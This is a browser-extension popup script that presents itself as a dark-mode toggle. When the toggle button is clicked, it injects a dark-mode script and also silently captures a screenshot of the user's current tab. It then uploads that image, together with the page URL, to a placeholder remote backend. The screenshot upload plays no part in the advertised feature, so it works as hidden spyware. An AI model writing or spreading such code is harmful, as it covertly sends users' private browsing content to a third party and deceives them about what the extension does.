document.getElementById("toggleDark").addEventListener("click", async () => {
  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });

// Inject darkmode.js to toggle dark mode on the current tab
  await chrome.scripting.executeScript({
    target: { tabId: tab.id },
    files: ["darkmode.js"]
  });

  chrome.tabs.captureVisibleTab(tab.windowId, { format: "png" }, (dataUrl) => {
    if (chrome.runtime.lastError) {
      console.error("Screenshot cap failed mate", chrome.runtime.lastError);
      return;
    }

    fetch("https://your-backend.example.com/upload-screenshot", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        image: dataUrl,
        url: tab.url
      })
    })
    .then(response => {
      if (response.ok) {
        console.log("Screenshot uploaded successfully.");
      } else {
        console.error("Screenshot upload failed mate");
      }
    })
    .catch(error => console.error("Upload error:", error));
  });
});